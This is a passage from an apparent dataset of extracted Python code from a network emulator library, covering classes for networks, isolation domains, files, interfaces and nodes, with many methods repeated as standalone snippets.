\"\"\"\n        return self.__name\n\n    def getType(self) -> NetworkType:\n        \"\"\"!\n        @brief Get type of this network.\n\n        @returns type.\n        \"\"\"\n        return self.__type\n\n    def getPrefix(self) -> IPv4Network:\n        \"\"\"!\n        @brief Get prefix of this network.\n\n        @returns prefix.\n        \"\"\"\n        return self.__prefix\n\n    def setHostIpRange(self, hostStart:int , hostEnd: int, hostStep: int):\n        \"\"\"!\n        @brief Set IP Range for host nodes\n\n        @param hostStart start address offset of host nodes.\n        @param hostEnd end address offset of host nodes.\n        @param hostStep end step of host address.\n        \"\"\"\n\n        self.__aac.setHostIpRange(hostStart, hostEnd, hostStep)\n        self.__assigners[NodeRole.Host] = self.__aac.getOffsetAssigner(NodeRole.Host)\n\n        return self\n        \n    def setDhcpIpRange(self, dhcpStart:int, dhcpEnd: int):\n        \"\"\"!\n        @brief Set IP Range for DHCP Server to use\n        \n        @param dhcpStart start address offset of dhcp clients.\n        @param dhcpEnd end address offset of dhcp clients.\n        \"\"\"\n        self.__aac.setDhcpIpRange(dhcpStart, dhcpEnd)\n        return self\n\n\n    def setRouterIpRange(self, routerStart:int, routerEnd:int, routerStep: int):\n        \n        \"\"\"!\n        @brief Set IP Range for router nodes\n\n        @param routerStart start address offset of router nodes.\n        @param routerEnd end address offset of router nodes.\n        @param routerStep end step of router address.\n        \"\"\"\n        \n        self.__aac.setRouterIpRange(routerStart, routerEnd, routerStep)\n        self.__assigners[NodeRole.Router] = self.__aac.getOffsetAssigner(NodeRole.Router)\n        return self\n\n    def getDhcpIpRange(self) -> list:\n        \"\"\"!\n        @brief Get IP range for DHCP server to use.\n        \"\"\"\n        return self.__aac.getDhcpIpRange()\n\n    def assign(self, nodeRole: NodeRole, asn: int = -1) -> IPv4Address:\n        \"\"\"!\n        @brief Assign IP for interface.\n\n        @param nodeRole role of the node getting this assignment.\n        @param asn optional. If interface type is InternetExchange, the asn for\n        IP address mapping.\n        \"\"\"\n        assert not (nodeRole == nodeRole.Host and self.__type == NetworkType.InternetExchange), 'trying to assign IX network to non-router node'\n\n        if self.__type == NetworkType.InternetExchange: return self.__prefix[self.__aac.mapIxAddress(asn)]\n        return self.__prefix[self.__assigners[nodeRole].next()]\n\n    def associate(self, node: 'Node'):\n        \"\"\"!\n        @brief Associate the node with network.\n\n        @param node node.\n        \"\"\"\n        self.__connected_nodes.append(node)\n\n    def getAssociations(self) -> List['Node']:\n        \"\"\"!\n        @brief Get list of associated nodes.\n\n        @returns list of nodes.\n        \"\"\"\n        return self.__connected_nodes\n\n    def enableRemoteAccess(self, provider: RemoteAccessProvider) -> Network:\n        \"\"\"!\n        @brief enable remote access on this network.\n\n        @param provider remote access provider to use.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        assert self.__type == NetworkType.Local, 'remote access can only be enabled on local networks.'\n        self.__rap = provider\n\n        return self\n\n    def disableRemoteAccess(self) -> Network:\n        \"\"\"!\n        @brief disable remote access on this network.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__rap = None\n\n        return self\n\n    def getRemoteAccessProvider(self) -> RemoteAccessProvider:\n        \"\"\"!\n        @brief get the remote access provider for this network.\n\n        @returns RAP, or None.\n        \"\"\"\n        return self.__rap\n\n    def print(self, indent: int) -> str:\n        out = ' ' * indent\n        out += 'Network {} ({}):\\n'.format(self.__name, self.__type)\n\n        indent += 4\n        out += ' ' * indent\n        out += 'Prefix: {}\\n'.format(self.__prefix)\n        out += self.__aac.print(indent)\n\n        if self.__rap != None:\n            indent += 4\n            out += ' ' * indent\n            out += 'Remote access provider: {}\\n'.format(self.__rap.getName())\n\n        return out",
  "def __init__(self, name: str, type: NetworkType, prefix: IPv4Network, aac: AddressAssignmentConstraint = None, direct: bool = False):\n        \"\"\"!\n        @brief Network constructor.\n\n        @param name name of the network. Note that this is considered a \"local\"\n        name. Networks can have the same name, as long as they are in different\n        contexts (i.e., different AS).\n        @param type type of the network.\n        @param prefix prefix of the network.\n        @param aac (optional) AddressAssignmentConstraint to use.\n        @param direct (optional) mark network as direct. A direct network will be\n        loaded to RIB by routing layer. Default to False.\n        \"\"\"\n        super().__init__()\n\n        self.__name = name\n        self.__type = type\n        self.__prefix = prefix\n        self.__aac = aac if aac != None else AddressAssignmentConstraint()\n        self.__assigners = {}\n\n        self.__connected_nodes = []\n\n        self.__assigners[NodeRole.Router] = self.__aac.getOffsetAssigner(NodeRole.Router)\n        self.__assigners[NodeRole.Host] = self.__aac.getOffsetAssigner(NodeRole.Host)\n\n        self.__d_latency = 0\n        self.__d_bandwidth = 0\n        self.__d_drop = 0\n\n        self.__mtu = 1500\n\n        self.__direct = direct\n\n        self.__rap = None",
  "def isDirect(self) -> bool:\n        \"\"\"!\n        @brief test if this network is direct network. A direct network will be\n        added to RIB of routing daemons.\n\n        @returns true if direct, false otherwise.\n        \"\"\"\n\n        return self.__direct",
  "def setDirect(self, direct: bool) -> Network:\n        \"\"\"!\n        @brief set if this network is direct network. A direct network will be\n        added to RIB of routing daemons.\n\n        @param direct bool, true to set the network as direct, false otherwise.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n\n        self.__direct = direct\n\n        return self",
  "def setMtu(self, mtu: int) -> Network:\n        \"\"\"!\n        @brief Set MTU of this network.\n\n        @param mtu MTU.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__mtu = mtu\n\n        return self",
  "def getMtu(self) -> int:\n        \"\"\"!\n        @brief Get MTU of this network.\n\n        @returns mtu.\n        \"\"\"\n        return self.__mtu",
  "def setDefaultLinkProperties(self, latency: int = 0, bandwidth: int = 0, packetDrop: float = 0) -> Network:\n        \"\"\"!\n        @brief Set default link properties of interfaces attached to the network.\n\n        @param latency (optional) latency to add to the link in ms, default 0. Note that this will be\n        apply on all interfaces, meaning the rtt between two hosts will be 2 * latency.\n        @param bandwidth (optional) egress bandwidth of the link in bps, 0 for unlimited, default 0.\n        @param packetDrop (optional) link packet drop as percentage, 0 for unlimited, default 0.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        assert latency >= 0, 'invalid latency'\n        assert bandwidth >= 0, 'invalid bandwidth'\n        assert packetDrop >= 0 and packetDrop <= 100, 'invalid packet drop'\n\n        self.__d_latency = latency\n        self.__d_bandwidth = bandwidth\n        self.__d_drop = packetDrop\n\n        return self",
  "def setType(self, newType: NetworkType) -> Network:\n        \"\"\"!\n        @brief overrides network type of this network. Do not use this unless\n        you know what you are doing.\n\n        @param newType new net type.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__type = newType\n\n        return self",
  "def getDefaultLinkProperties(self) -> Tuple[int, int, int]:\n        \"\"\"!\n        @brief Get default link properties.\n\n        @returns tuple (latency, bandwidth, packet drop)\n        \"\"\"\n        return (self.__d_latency, self.__d_bandwidth, self.__d_drop)",
  "def getName(self) -> str:\n        \"\"\"!\n        @brief Get name of this network.\n\n        @returns name.\n        \"\"\"\n        return self.__name",
  "def getType(self) -> NetworkType:\n        \"\"\"!\n        @brief Get type of this network.\n\n        @returns type.\n        \"\"\"\n        return self.__type",
  "def getPrefix(self) -> IPv4Network:\n        \"\"\"!\n        @brief Get prefix of this network.\n\n        @returns prefix.\n        \"\"\"\n        return self.__prefix",
  "def setHostIpRange(self, hostStart:int , hostEnd: int, hostStep: int):\n        \"\"\"!\n        @brief Set IP Range for host nodes\n\n        @param hostStart start address offset of host nodes.\n        @param hostEnd end address offset of host nodes.\n        @param hostStep end step of host address.\n        \"\"\"\n\n        self.__aac.setHostIpRange(hostStart, hostEnd, hostStep)\n        self.__assigners[NodeRole.Host] = self.__aac.getOffsetAssigner(NodeRole.Host)\n\n        return self",
  "def setDhcpIpRange(self, dhcpStart:int, dhcpEnd: int):\n        \"\"\"!\n        @brief Set IP Range for DHCP Server to use\n        \n        @param dhcpStart start address offset of dhcp clients.\n        @param dhcpEnd end address offset of dhcp clients.\n        \"\"\"\n        self.__aac.setDhcpIpRange(dhcpStart, dhcpEnd)\n        return self",
  "def setRouterIpRange(self, routerStart:int, routerEnd:int, routerStep: int):\n        \n        \"\"\"!\n        @brief Set IP Range for router nodes\n\n        @param routerStart start address offset of router nodes.\n        @param routerEnd end address offset of router nodes.\n        @param routerStep end step of router address.\n        \"\"\"\n        \n        self.__aac.setRouterIpRange(routerStart, routerEnd, routerStep)\n        self.__assigners[NodeRole.Router] = self.__aac.getOffsetAssigner(NodeRole.Router)\n        return self",
  "def getDhcpIpRange(self) -> list:\n        \"\"\"!\n        @brief Get IP range for DHCP server to use.\n        \"\"\"\n        return self.__aac.getDhcpIpRange()",
  "def assign(self, nodeRole: NodeRole, asn: int = -1) -> IPv4Address:\n        \"\"\"!\n        @brief Assign IP for interface.\n\n        @param nodeRole role of the node getting this assignment.\n        @param asn optional. If interface type is InternetExchange, the asn for\n        IP address mapping.\n        \"\"\"\n        assert not (nodeRole == nodeRole.Host and self.__type == NetworkType.InternetExchange), 'trying to assign IX network to non-router node'\n\n        if self.__type == NetworkType.InternetExchange: return self.__prefix[self.__aac.mapIxAddress(asn)]\n        return self.__prefix[self.__assigners[nodeRole].next()]",
  "def associate(self, node: 'Node'):\n        \"\"\"!\n        @brief Associate the node with network.\n\n        @param node node.\n        \"\"\"\n        self.__connected_nodes.append(node)",
  "def getAssociations(self) -> List['Node']:\n        \"\"\"!\n        @brief Get list of associated nodes.\n\n        @returns list of nodes.\n        \"\"\"\n        return self.__connected_nodes",
  "def enableRemoteAccess(self, provider: RemoteAccessProvider) -> Network:\n        \"\"\"!\n        @brief enable remote access on this network.\n\n        @param provider remote access provider to use.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        assert self.__type == NetworkType.Local, 'remote access can only be enabled on local networks.'\n        self.__rap = provider\n\n        return self",
  "def disableRemoteAccess(self) -> Network:\n        \"\"\"!\n        @brief disable remote access on this network.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__rap = None\n\n        return self",
  "def getRemoteAccessProvider(self) -> RemoteAccessProvider:\n        \"\"\"!\n        @brief get the remote access provider for this network.\n\n        @returns RAP, or None.\n        \"\"\"\n        return self.__rap",
  "def print(self, indent: int) -> str:\n        out = ' ' * indent\n        out += 'Network {} ({}):\\n'.format(self.__name, self.__type)\n\n        indent += 4\n        out += ' ' * indent\n        out += 'Prefix: {}\\n'.format(self.__prefix)\n        out += self.__aac.print(indent)\n\n        if self.__rap != None:\n            indent += 4\n            out += ' ' * indent\n            out += 'Remote access provider: {}\\n'.format(self.__rap.getName())\n\n        return out",
  "class IsolationDomain(Printable):\n    \"\"\"!\n    @brief SCION isolation domain.\n    \"\"\"\n\n    __id: int\n    __label: Optional[str]\n\n    def __init__(self, id: int, label: Optional[str]):\n        self.__id = id\n        self.__label = label\n\n    def getId(self) -> int:\n        \"\"\"!\n        @brief Get the unique numerical identifier of the ISD.\n        \"\"\"\n        return self.__id\n\n    def getLabel(self) -> Optional[str]:\n        \"\"\"!\n        @brief Get the optional human-readable ISD label.\n        \"\"\"\n        return self.__label\n\n    def setLabel(self, label: str) -> IsolationDomain:\n        \"\"\"!\n        @brief Set a human-readable label or name for the ISD.\n\n        @param label New label to set.\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__label = label\n        return self\n\n    def print(self, indent: int) -> str:\n        return \"{}ISD {} (label: {})\".format(\n            \" \" * indent, self.__id, self.__label)",
  "def __init__(self, id: int, label: Optional[str]):\n        self.__id = id\n        self.__label = label",
  "def getId(self) -> int:\n        \"\"\"!\n        @brief Get the unique numerical identifier of the ISD.\n        \"\"\"\n        return self.__id",
  "def getLabel(self) -> Optional[str]:\n        \"\"\"!\n        @brief Get the optional human-readable ISD label.\n        \"\"\"\n        return self.__label",
  "def setLabel(self, label: str) -> IsolationDomain:\n        \"\"\"!\n        @brief Set a human-readable label or name for the ISD.\n\n        @param label New label to set.\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__label = label\n        return self",
  "def print(self, indent: int) -> str:\n        return \"{}ISD {} (label: {})\".format(\n            \" \" * indent, self.__id, self.__label)",
  "class File(Printable):\n    \"\"\"!\n    @brief File class.\n\n    This class represents a file on a node.\n    \"\"\"\n\n    __content: str\n    __path: str\n\n    def __init__(self, path: str, content: str = ''):\n        \"\"\"!\n        @brief File constructor.\n\n        Put a file onto a node.\n\n        @param path path of the file.\n        @param content content of the file.\n        \"\"\"\n        self.__path = path\n        self.__content = content\n\n    def setPath(self, path: str) -> File:\n        \"\"\"!\n        @brief Update file path.\n\n        @param path new path.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__path = path\n\n        return self\n\n    def setContent(self, content: str) -> File:\n        \"\"\"!\n        @brief Update file content.\n\n        @param content content.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__content = content\n\n        return self\n\n    def appendContent(self, content: str) -> File:\n        \"\"\"!\n        @brief Append to file.\n\n        @param content content.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__content += content\n\n        return self\n\n    def get(self) -> Tuple[str, str]:\n        \"\"\"!\n        @brief Get file path and content.\n\n        @returns a tuple where the first element is path and second element is\n        content\n        \"\"\"\n        return (self.__path, self.__content)\n\n    def print(self, indent: int) -> str:\n        out = ' ' * indent\n        out += \"{}:\\n\".format(self.__path)\n        indent += 4\n        for line in self.__content.splitlines():\n            out += ' ' * indent\n            out += '> '\n            out += line\n            out += '\\n'\n        return out",
  "class Interface(Printable):\n    \"\"\"!\n    @brief Interface class.\n\n    This class represents a network interface card.\n    \"\"\"\n\n    __network: Network\n    __address: IPv4Address\n\n    __latency: int       # in ms\n    __bandwidth: int     # in bps\n    __drop: float        # percentage\n\n    def __init__(self, net: Network):\n        \"\"\"!\n        @brief Interface constructor.\n\n        @param net network to connect to.\n        \"\"\"\n        self.__address = None\n        self.__network = net\n        (l, b, d) = net.getDefaultLinkProperties()\n        self.__latency = l\n        self.__bandwidth = b\n        self.__drop = d\n\n    def setLinkProperties(self, latency: int = 0, bandwidth: int = 0, packetDrop: float = 0) -> Interface:\n        \"\"\"!\n        @brief Set link properties.\n\n        @param latency (optional) latency to add to the link in ms, default 0.\n        @param bandwidth (optional) egress bandwidth of the link in bps, 0 for unlimited, default 0.\n        @param packetDrop (optional) link packet drop as percentage, 0 for unlimited, default 0.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n\n        assert latency >= 0, 'invalid latency'\n        assert bandwidth >= 0, 'invalid bandwidth'\n        assert packetDrop >= 0 and packetDrop <= 100, 'invalid packet drop'\n\n        self.__latency = latency\n        self.__bandwidth = bandwidth\n        self.__drop = packetDrop\n\n        return self\n\n    def getLinkProperties(self) -> Tuple[int, int, int]:\n        \"\"\"!\n        @brief Get link properties.\n\n        @returns tuple (latency, bandwidth, packet drop)\n        \"\"\"\n        return (self.__latency, self.__bandwidth, self.__drop)\n\n    def getNet(self) -> Network:\n        \"\"\"!\n        @brief Get the network that this interface attached to.\n\n        @returns network.\n        \"\"\"\n        return self.__network\n\n    def setAddress(self, address: IPv4Address) -> Interface:\n        \"\"\"!\n        @brief Set IPv4 address of this interface.\n\n        @param address address.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__address = address\n\n        return self\n\n    def getAddress(self) -> IPv4Address:\n        \"\"\"!\n        @brief Get IPv4 address of this interface.\n\n        @returns address.\n        \"\"\"\n        return self.__address\n\n    def print(self, indent: int) -> str:\n        out = ' ' * indent\n        out += 'Interface:\\n'\n\n        indent += 4\n        out += ' ' * indent\n        out += 'Connected to: {}\\n'.format(self.__network.getName())\n        out += ' ' * indent\n        out += 'Address: {}\\n'.format(self.__address)\n        out += ' ' * indent\n        out += 'Link Properties: {}\\n'.format(self.__address)\n\n        indent += 4\n        out += ' ' * indent\n        out += 'Added Latency: {} ms\\n'.format(self.__latency)\n        out += ' ' * indent\n        out += 'Egress Bandwidth Limit: {} bps\\n'.format('unlimited' if self.__bandwidth <= 0 else self.__bandwidth)\n\n        return out",
  "class Node(Printable, Registrable, Configurable, Vertex):\n    \"\"\"!\n    @brief Node base class.\n\n    This class represents a generic node.\n    \"\"\"\n\n    __name: str\n    __base_system: BaseSystem\n    __asn: int\n    __scope: str\n    __role: NodeRole\n    __classes: List[str]\n    __label: Dict[str, str]\n    __interfaces: List[Interface]\n    __files: Dict[str, File]\n    __imported_files: Dict[str, str]\n    __softwares: Set[str]\n    __build_commands: List[str]\n    __start_commands: List[Tuple[str, bool]]\n    __ports: List[Tuple[int, int, str]]\n    __privileged: bool\n\n    __configured: bool\n    __pending_nets: List[Tuple[str, str]]\n    __xcs: Dict[Tuple[str, int], Tuple[IPv4Interface, str]]\n\n    __shared_folders: Dict[str, str]\n    __persistent_storages: List[str]\n\n    __name_servers: List[str]\n\n    def __init__(self, name: str, role: NodeRole, asn: int, scope: str = None):\n        \"\"\"!\n        @brief Node constructor.\n\n        @name name name of this node.\n        @param role role of this node.\n        @param asn network that this node belongs to.\n        @param scope scope of the node, if not asn.\n        \"\"\"\n        super().__init__()\n\n        self.__interfaces = []\n        self.__files = {}\n        self.__imported_files = {}\n        self.__asn = asn\n        self.__role = role\n        self.__name = name\n        self.__classes = []\n        self.__label = {}\n        self.__scope = scope if scope != None else str(asn)\n        self.__softwares = set()\n        self.__build_commands = []\n        self.__start_commands = []\n        self.__ports = []\n        self.__privileged = False\n        self.__base_system = BaseSystem.DEFAULT\n\n        self.__pending_nets = []\n        self.__xcs = {}\n        self.__configured = False\n\n        self.__shared_folders = {}\n        self.__persistent_storages = []\n\n        # for soft in DEFAULT_SOFTWARE:\n        #     self.__softwares.add(soft)\n\n        self.__name_servers = []\n\n    def configure(self, emulator: Emulator):\n        \"\"\"!\n        @brief configure the node. This is called when rendering.\n\n        NICs will be setup during the configuring process. No new interfaces\n        can be added after configuration.\n\n        @param emulator Emulator object to use to configure.\n        \"\"\"\n        assert not self.__configured, 'Node already configured.'\n        assert not self.__asn == 0, 'Virtual physical node must not be used in render/configure'\n\n        reg = emulator.getRegistry()\n\n        for (netname, address) in self.__pending_nets:\n\n            hit = False\n\n            if reg.has(self.__scope, \"net\", netname):\n                hit = True\n                self.__joinNetwork(reg.get(self.__scope, \"net\", netname), address)\n\n            if not hit and reg.has(\"ix\", \"net\", netname):\n                hit = True\n                self.__joinNetwork(reg.get(\"ix\", \"net\", netname), address)\n\n            if not hit and reg.has(\"seedemu\", \"net\", netname):\n                hit = True\n                self.__joinNetwork(reg.get(\"seedemu\", \"net\", netname), address)\n\n            assert hit, 'no network matched for name {}'.format(netname)\n\n        for (peername, peerasn) in list(self.__xcs.keys()):\n            peer: Node = None\n\n            if reg.has(str(peerasn), 'rnode', peername): peer = reg.get(str(peerasn), 'rnode', peername)\n            elif reg.has(str(peerasn), 'hnode', peername): peer = reg.get(str(peerasn), 'hnode', peername)\n            else: assert False, 'as{}/{}: cannot xc to node as{}/{}: no such node'.format(self.getAsn(), self.getName(), peerasn, peername)\n\n            (peeraddr, netname) = peer.getCrossConnect(self.getAsn(), self.getName())\n            (localaddr, _) = self.__xcs[(peername, peerasn)]\n            assert localaddr.network == peeraddr.network, 'as{}/{}: cannot xc to node as{}/{}: {}.net != {}.net'.format(self.getAsn(), self.getName(), peerasn, peername, localaddr, peeraddr)\n\n            if netname != None:\n                self.__joinNetwork(reg.get('xc', 'net', netname), str(localaddr.ip))\n                self.__xcs[(peername, peerasn)] = (localaddr, netname)\n            else:\n                # netname = 'as{}.{}_as{}.{}'.format(self.getAsn(), self.getName(), peerasn, peername)\n                netname = ''.join(choice(ascii_letters) for i in range(10))\n                net = Network(netname, NetworkType.CrossConnect, localaddr.network, direct = False) # TODO: XC nets w/ direct flag?\n                self.__joinNetwork(reg.register('xc', 'net', netname, net), str(localaddr.ip))\n                self.__xcs[(peername, peerasn)] = (localaddr, netname)\n\n        if len(self.__name_servers) == 0:\n            return\n\n        self.insertStartCommand(0,': > /etc/resolv.conf')\n        for idx, s in enumerate(self.__name_servers, start=1):\n            self.insertStartCommand(idx, 'echo \"nameserver {}\" >> /etc/resolv.conf'.format(s))\n\n    def setNameServers(self, servers: List[str]) -> Node:\n        \"\"\"!\n        @brief set recursive name servers to use on this node. Overwrites\n        AS-level and emulator-level settings.\n\n        @param servers list of IP addresses of recursive name servers. Set to\n        empty list to use default (i.e., do not change, or use\n        AS-level/emulator-level settings)\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        assert not self.__asn == 0, 'This API is only available on a real physical node.'\n\n        self.__name_servers = servers\n\n        return self\n\n    def getNameServers(self) -> List[str]:\n        \"\"\"!\n        @brief get configured recursive name servers on this node.\n\n        @returns list of IP addresses of recursive name servers\n        \"\"\"\n        assert not self.__asn == 0, 'This API is only available on a real physical node.'\n\n        return self.__name_servers\n\n    def addPort(self, host: int, node: int, proto: str = 'tcp') -> Node:\n        \"\"\"!\n        @brief Add port forwarding.\n\n        @param host port of the host.\n        @param node port of the node.\n        @param proto protocol.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__ports.append((host, node, proto))\n\n    def addPortForwarding(self, host: int, node: int, proto:str = 'tcp') -> Node:\n        \"\"\"!\n        @brief Achieves the same as the addPort function.\n        @brief Keeping addPort to avoid breaking other examples.\n        @brief Just a more descriptive name.\n        \"\"\"\n        self.__ports.append((host, node, proto))\n\n    def getPorts(self) -> List[Tuple[int, int, str]]:\n        \"\"\"!\n        @brief Get port forwardings.\n\n        @returns list of tuple of ports (host, node).\n\n        \"\"\"\n        return self.__ports\n\n    def setPrivileged(self, privileged: bool) -> Node:\n        \"\"\"!\n        @brief Set or unset the node as privileged node.\n\n        Some backend like Docker will require the container to be privileged\n        in order to do some privileged operations.\n\n        @param privileged (optional) set if node is privileged.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__privileged = privileged\n\n    def isPrivileged(self) -> bool:\n        \"\"\"!\n        @brief Test if node is set to privileged.\n\n        @returns True if privileged, False otherwise.\n        \"\"\"\n        return self.__privileged\n\n    def setBaseSystem(self, base_system: BaseSystem) -> Node:\n        \"\"\"!\n        @brief Set a base_system of a node.\n\n        @param base_system base_system to use.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__base_system = base_system\n\n    def getBaseSystem(self) -> BaseSystem:\n        \"\"\"!\n        @brief Get configured base system on this node.\n\n        @returns base system.\n        \"\"\"\n        return self.__base_system\n\n    def __joinNetwork(self, net: Network, address: str = \"auto\"):\n        \"\"\"!\n        @brief Connect the node to a network.\n        @param net network to connect.\n        @param address (optional) override address assignment.\n\n        @throws AssertionError if network does not exist.\n        \"\"\"\n\n        if address == \"auto\": _addr = net.assign(self.__role, self.__asn)\n        elif address == \"dhcp\":\n            _addr = None\n            self.__name_servers = []\n            self.addSoftware('isc-dhcp-client')\n            self.setFile('dhclient.sh', '''\\\n            #!/bin/bash\n            ip addr flush {iface}\n            err=$(dhclient {iface} 2>&1)\n\n            if [ -z \"$err\" ]\n            then\n                    echo \"dhclient success\"\n            else\n                    filename=$(echo $err | cut -d \"'\" -f 2)\n                    cp $filename /etc/resolv.conf\n                    rm $filename\n            fi\n            '''.format(iface=net.getName()))\n            self.appendStartCommand('chmod +x dhclient.sh; ./dhclient.sh')\n\n        else: _addr = IPv4Address(address)\n\n        _iface = Interface(net)\n        _iface.setAddress(_addr)\n\n        self.__interfaces.append(_iface)\n\n        net.associate(self)\n\n    def joinNetwork(self, netname: str, address: str = \"auto\") -> Node:\n        \"\"\"!\n        @brief Connect the node to a network.\n        @param netname name of the network.\n        @param address (optional) override address assignment.\n\n        @returns assigned IP address\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        assert not self.__asn == 0, 'This API is only available on a real physical node.'\n        assert not self.__configured, 'Node already configured.'\n\n        self.__pending_nets.append((netname, address))\n\n        return self\n\n    def updateNetwork(self, netname:str, address: str= \"auto\") -> Node:\n        \"\"\"!\n        @brief Update connection of the node to a network.\n        @param netname name of the network.\n        @param address (optional) override address assignment.\n\n        @returns assigned IP address\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        assert not self.__asn == 0, 'This API is only available on a real physical node.'\n\n        for pending_netname, pending_address in self.__pending_nets:\n            if pending_netname == netname:\n                self.__pending_nets.remove((pending_netname, pending_address))\n\n        self.__pending_nets.append((netname, address))\n\n        return self\n\n    def crossConnect(self, peerasn: int, peername: str, address: str) -> Node:\n        \"\"\"!\n        @brief create new p2p cross-connect connection to a remote node.\n        @param peername node name of the peer node.\n        @param peerasn asn of the peer node.\n        @param address address to use on the interface in CIDR notation. Must\n        be within the same subnet.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        assert not self.__asn == 0, 'This API is only available on a real physical node.'\n        assert peername != self.getName() or peerasn != self.getName(), 'cannot XC to self.'\n        self.__xcs[(peername, peerasn)] = (IPv4Interface(address), None)\n\n    def getCrossConnect(self, peerasn: int, peername: str) -> Tuple[IPv4Interface, str]:\n        \"\"\"!\n        @brief retrieve IP address for the given peer.\n        @param peername node name of the peer node.\n        @param peerasn asn of the peer node.\n\n        @returns tuple of IP address and XC network name. XC network name will\n        be None if the network has not yet been created.\n        \"\"\"\n        assert not self.__asn == 0, 'This API is only available on a real physical node.'\n        assert (peername, peerasn) in self.__xcs, 'as{}/{} is not in the XC list.'.format(peerasn, peername)\n        return self.__xcs[(peername, peerasn)]\n\n    def getCrossConnects(self) -> Dict[Tuple[str, int], Tuple[IPv4Interface, str]]:\n        \"\"\"!\n        @brief get all cross connects on this node.\n\n        @returns dict, where key is (peer node name, peer node asn) and value is (address on interface, netname)\n        \"\"\"\n        assert not self.__asn == 0, 'This API is only available on a real physical node.'\n        return self.__xcs\n\n    def getName(self) -> str:\n        \"\"\"!\n        @brief Get node name.\n\n        @returns name.\n        \"\"\"\n        return self.__name\n\n    def getAsn(self) -> int:\n        \"\"\"!\n        @brief Get node parent AS ASN.\n\n        @returns asn.\n        \"\"\"\n        return self.__asn\n\n    def getRole(self) -> NodeRole:\n        \"\"\"!\n        @brief Get role of current node.\n\n        Get role type of current node.\n\n        @returns role.\n        \"\"\"\n        return self.__role\n\n    def appendClassName(self, className:str) -> Node:\n        \"\"\"!\n        @brief Append class to a current node\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__classes.append(className)\n\n        return self\n\n    def getClasses(self) -> list:\n        \"\"\"!\n        @brief Get service of current node\n\n        @returns service\n        \"\"\"\n\n        return self.__classes\n\n    def setClasses(self, classes:list) -> list:\n        \"\"\"!\n        @brief Set service of current node\n\n        @returns self for chaining API calls.\n        \"\"\"\n        self.__classes = classes\n        return self\n\n    def setLabel(self, key:str, value:str) -> Node:\n        \"\"\"!\n        @brief Add Label to a current node\n\n        @returns self, for chaining API calls.\n        \"\"\"\n\n        self.__label[key] = value\n        return self\n\n    def getLabel(self) -> dict:\n        return self.__label\n\n    def getFile(self, path: str) -> File:\n        \"\"\"!\n        @brief Get a file object, and create if not exist.\n\n        @param path file path.\n        @returns file.\n        \"\"\"\n        if path in self.__files: return self.__files[path]\n        self.__files[path] = File(path)\n        return self.__files[path]\n\n    def getFiles(self) -> List[File]:\n        \"\"\"!\n        @brief Get all files.\n\n        @return list of files.\n        \"\"\"\n        return self.__files.values()\n\n    def setFile(self, path: str, content: str) -> Node:\n        \"\"\"!\n        @brief Set content of the file.\n\n        @param path path of the file. Will be created if not exist, and will be\n        override if already exist.\n        @param content file content.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.getFile(path).setContent(content)\n\n        return self\n\n    def appendFile(self, path: str, content: str) -> Node:\n        \"\"\"!\n        @brief Append content to a file.\n\n        @param path path of the file. Will be created if not exist.\n        @param content content to append.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.getFile(path).appendContent(content)\n\n        return self\n\n    def getImportedFiles(self) -> Dict[str, str]:\n        \"\"\"!\n        @brief Get imported files.\n\n        @returns dict of imported files, where key = path of the file in the\n        container, value = path of the file on the host.\n        \"\"\"\n        return self.__imported_files\n\n    def importFile(self, hostpath: str, containerpath: str) -> Node:\n        \"\"\"!\n        @brief Import a file from the host to the container.\n\n        @param hostpath path of the file on the host. (should be absolute to\n        prevent issues)\n        @param containerpath path of the file in the container.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__imported_files[containerpath] = hostpath\n\n        return self\n\n    def addSoftware(self, name: str) -> Node:\n        \"\"\"!\n        @brief Add new software to node.\n\n        @param name software package name.\n\n        Use this to add software to the node. For example, if using the \"docker\"\n        compiler, this will be added as an \"apt-get install\" line in Dockerfile.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        if ' ' in name:\n            for soft in name.split(' '):\n                self.__softwares.add(soft)\n        else:\n            self.__softwares.add(name)\n\n        return self\n\n    def getSoftware(self) -> Set[str]:\n        \"\"\"!\n        @brief Get set of software.\n\n        @returns set of softwares.\n        \"\"\"\n        return self.__softwares\n\n    def addBuildCommand(self, cmd: str) -> Node:\n        \"\"\"!\n        @brief Add new command to build step.\n\n        Use this to add build steps to the node. For example, if using the\n        \"docker\" compiler, this will be added as a \"RUN\" line in Dockerfile.\n\n        @param cmd command to add.\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__build_commands.append(cmd)\n\n        return self\n\n    def getBuildCommands(self) -> List[str]:\n        \"\"\"!\n        @brief Get build commands.\n\n        @returns list of commands.\n        \"\"\"\n        return self.__build_commands\n\n    def insertStartCommand(self, index: int, cmd: str, fork: bool = False) -> Node:\n        \"\"\"!\n        @brief Add new command to start script.\n\n        The command should not be a blocking command. If you need to run a\n        blocking command, set fork to true and fork it to the background so\n        that it won't block the execution of other commands.\n\n        Use this to add start steps to the node. For example, if using the\n        \"docker\" compiler, this will be added to start.sh.\n\n        @param index index to insert command in.\n        @param cmd command to add.\n        @param fork (optional) fork to command to background?\n\n        @returns self, for chaining API calls.\n        \"\"\"\n        self.__start_commands.insert(index, (cmd, 